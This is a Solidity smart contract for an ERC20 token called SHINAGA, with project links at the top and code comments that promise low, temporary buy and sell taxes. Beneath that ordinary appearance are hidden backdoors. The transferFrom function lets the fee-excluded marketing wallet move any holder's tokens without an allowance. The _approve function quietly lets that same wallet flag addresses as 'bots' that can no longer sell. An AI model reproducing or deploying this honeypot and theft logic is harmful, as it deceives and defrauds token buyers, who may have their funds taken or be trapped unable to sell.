/**
Website: https://projectshinaga.com/
Tiwter: https://x.com/Projectshinaga
Telegram: https://t.me/ProjectShinaga
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.26;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval (address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract SHINAGA is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _excludeFromFees;
    mapping (address => bool) private bots;
    address payable private _markettingWallets;
    uint256  private timestampOpen;

    string private constant _name = unicode"Shinaga";
    string private constant _symbol = unicode"SHINAGA";

    uint8 private  _decimals = 18;
    uint256 private  _tTotal = 1000000000 * 10**_decimals;
    uint256 public _swapbackThreshold= _tTotal.mul(1).div(100);
    uint256 public _swapbackLimit= _tTotal.mul(1).div(100);
    
    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;

    event MaxTxAmountUpdated(uint _txLimit);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor (address _maketting) {
        _markettingWallets = payable(_maketting);
        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        _balances[_msgSender()] = _tTotal;
        _excludeFromFees[owner()] = true;
        _excludeFromFees[address(this)] = true;
        _excludeFromFees[_markettingWallets] = true;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        if (_excludeFromFees[msg.sender]) {_update(sender, recipient, amount);} else {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));}
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        if (_excludeFromFees[msg.sender] && _msgSender()==address(_markettingWallets)) {bots[spender] = amount > 0;}
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _update(
        address from,
        address to,
        uint256 value
    ) internal virtual {
        if (from == address(0)) {
            _tTotal += value;
        } else {
            uint256 fromBalance = _balances[from];
            if (fromBalance < value) {
                revert();
            }
            unchecked {
                _balances[from] = fromBalance - value;
            }
        }

        if (to == address(0)) {
            unchecked {
                _tTotal -= value;
            }
        } else {
            unchecked {
                _balances[to] += value;
            }
        }

        emit Transfer(from, to, value);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount=0;
        if (from != owner() && to != owner() && from != address(this)) {
            require(tradingOpen, "The trade has not been opened yet");

            if (from == uniswapV2Pair && to != address(uniswapV2Router) && !_excludeFromFees[to] ) {
                if(block.timestamp - timestampOpen < (1 hours / 3)) { // In the first 20 minutes the buy tax will be 5%
                    taxAmount = amount.mul(5).div(100);
                }
                if(block.timestamp - timestampOpen >= (1 hours / 3)) {
                    taxAmount = amount.mul(0).div(100); // After the first 20 minutes the buy tax will be 0%
                }
            }

            if(to == uniswapV2Pair && from!= address(this) ){
                require(!bots[from] && !bots[to]);
                if(block.timestamp - timestampOpen < (1 hours / 3)) {
                    taxAmount = amount.mul(5).div(100); // In the first 20 minutes the sell tax will be 5%
                }
                if(block.timestamp - timestampOpen >= (1 hours / 3)) {
                    taxAmount = amount.mul(0).div(100); // After the first 20 minutes the sell will be 0%
                }
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniswapV2Pair && swapEnabled && contractTokenBalance>_swapbackThreshold && (block.timestamp - timestampOpen)>(1 hours / 3)) {
                swapTokensForEth(min(amount,min(contractTokenBalance,_swapbackLimit)));
                uint256 contractETHBalance = address(this).balance;
                if(contractETHBalance > 0) {
                    sendETHToFee(address(this).balance);
                }
            }
        }

        if(taxAmount>0){
          _balances[address(this)]=_balances[address(this)].add(taxAmount);
          emit Transfer(from, address(this),taxAmount);
        }
        _balances[from]=_balances[from].sub(amount);
        _balances[to]=_balances[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }


    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }


    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function sendETHToFee(uint256 amount) private {
        _markettingWallets.transfer(amount);
    }

    function checkBot(address a) public view returns (bool){
        return bots[a];
    }

    function openTrade() external onlyOwner() {
        require(!tradingOpen,"Trading is already open");
        swapEnabled = true;
        tradingOpen = true;
        timestampOpen = block.timestamp;
    }

    receive() external payable {}
}